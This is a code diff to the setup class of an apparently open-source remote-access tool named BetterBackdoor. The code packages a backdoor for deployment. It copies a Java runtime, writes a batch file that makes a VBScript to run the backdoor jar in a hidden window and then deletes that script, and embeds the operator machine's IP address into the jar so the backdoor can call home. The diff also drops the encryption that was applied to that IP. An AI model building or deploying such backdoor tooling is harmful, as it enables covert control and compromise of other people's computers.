@@ -20,8 +20,17 @@ import com.github.thatcherdev.betterbackdoor.backend.Utils;
 public class Setup {
 
 	/**
-	 * Copys and creates all necesarry files and directories needed for a working
-	 * backdoor to directory "backdoor".
+	 * Sets up backdoor.
+	 * <p>
+	 * If {@link packageJre} is true, copies the current machines JRE to directory
+	 * 'backdoor' and {@link #createBat(String, String, String)} is used to create a
+	 * '.bat' file for running the backdoor in the JRE. If {@link packageJre} is
+	 * false but directory 'jre' containing a Windows JRE distribution exists, 'jre'
+	 * is copied to 'backdoor' and {@link #createBat(String, String, String)} is
+	 * used to create a '.bat' file for running the backdoor in the JRE. 'run.jar'
+	 * is copied from 'target' to 'backdoor' and 'ip', a text file containing the
+	 * current machine's IPv4 address, is appended into it using
+	 * {@link #appendJar(String, String, String)}.
 	 *
 	 * @param packageJre if a JRE should be packaged with backdoor
 	 * @throws IOException
@@ -33,57 +42,49 @@ public class Setup {
 					new File("backdoor" + File.separator + "jre" + File.separator + "bin"));
 			FileUtils.copyDirectory(new File(jrePath + File.separator + "lib"),
 					new File("backdoor" + File.separator + "jre" + File.separator + "lib"));
-		} else if ((BetterBackdoor.os.contains("Linux") || BetterBackdoor.os.contains("Mac"))
-				&& new File("jre").isDirectory()) {
+			createBat("backdoor" + File.separator + "run.bat");
+		} else if (new File("jre").isDirectory()) {
 			FileUtils.copyDirectory(new File("jre"), new File("backdoor" + File.separator + "jre"));
-			createBat("backdoor" + File.separator + "run.bat", "jre", "run");
+			createBat("backdoor" + File.separator + "run.bat");
 		}
-		FileUtils.copyDirectory(new File("scripts"), new File("backdoor" + File.separator + "scripts"));
 		FileUtils.copyFile(new File("target" + File.separator + "run.jar"),
 				new File("backdoor" + File.separator + "run.jar"));
-		appendJar("backdoor" + File.separator + "run.jar", "ip", Utils.crypt(Utils.getIP(), "BetterBackdoorIP"));
+		appendJar("backdoor" + File.separator + "run.jar", "ip", Utils.getIP());
 	}
 
 	/**
 	 * Creates a '.bat' batch file for running a jar file in a Java Runtime
 	 * Environment.
 	 *
-	 * @param filePath Path of '.bat' batch file to create.
-	 * @param jrePath  Path to jre.
-	 * @param jarName  Name of '.jar' file to run.
+	 * @param filePath path of '.bat' batch file to create
 	 * @throws FileNotFoundException
 	 */
-	private static void createBat(String filePath, String jrePath, String jarName) throws FileNotFoundException {
+	private static void createBat(String filePath) throws FileNotFoundException {
 		PrintWriter out = new PrintWriter(new File(filePath));
 		out.println(
-				"@echo off\n%~d0 & cd %~dp0\necho Set objShell = WScript.CreateObject(\"WScript.Shell\")>run.vbs\necho objShell.Run \"cmd /c if exist "
-						+ jrePath + "\\ (" + jrePath + "\\bin\\java " + "-jar " + jarName + ".jar) else (java -jar "
-						+ jarName
-						+ ".jar)\", ^0, True>>run.vbs\nstart run.vbs\ncall:delvbs\n:delvbs\nif exist run.vbs (\n timeout 3 > nul\n del run.vbs\n @exit\n"
+				"@echo off\n%~d0 & cd %~dp0\necho Set objShell = WScript.CreateObject(\"WScript.Shell\")>run.vbs\necho objShell.Run \"cmd /c "
+						+ "jre\\bin\\java -jar run.jar\", ^0, True>>run.vbs\nstart run.vbs\ncall:delvbs\n:delvbs\nif exist run.vbs (\n timeout 3 > nul\n del run.vbs\n @exit\n"
 						+ ") else (\ncall:delvbs\n)\ngoto:eof");
 		out.flush();
 		out.close();
 	}
 
 	/**
-	 * Puts a new file with name {@link newFile} and contents
-	 * {@link newFileContents} into existing jar file with name {@link jarFile}.
+	 * Appends a new file with name {@link filename} and contents
+	 * {@link fileContents} into existing jar file with name {@link jarFile}.
 	 * 
-	 * @param jarFile         name of jar file to put new file with name
-	 *                        {@link newFile} in
-	 * @param newFile         name of new file to put in jar file with name
-	 *                        {@link jarFile}
-	 * @param newFileContents contents of new file with name {@link newFile} to put
-	 *                        in jar file
+	 * @param jarFile      name of jar file to append
+	 * @param filename     name of new file to append in jar
+	 * @param fileContents contents of new file to append in jar
 	 * @throws IOException
 	 */
-	private static void appendJar(String jarFile, String newFile, String newFileContents) throws IOException {
+	private static void appendJar(String jarFile, String filename, String fileContents) throws IOException {
 		Map<String, String> env = new HashMap<>();
 		env.put("create", "true");
 		try (FileSystem fileSystem = FileSystems.newFileSystem(URI.create("jar:" + Paths.get(jarFile).toUri()), env)) {
-			try (Writer writer = Files.newBufferedWriter(fileSystem.getPath(newFile), StandardCharsets.UTF_8,
+			try (Writer writer = Files.newBufferedWriter(fileSystem.getPath(filename), StandardCharsets.UTF_8,
 					StandardOpenOption.CREATE)) {
-				writer.write(newFileContents);
+				writer.write(fileContents);
 				writer.close();
 			}
 		}
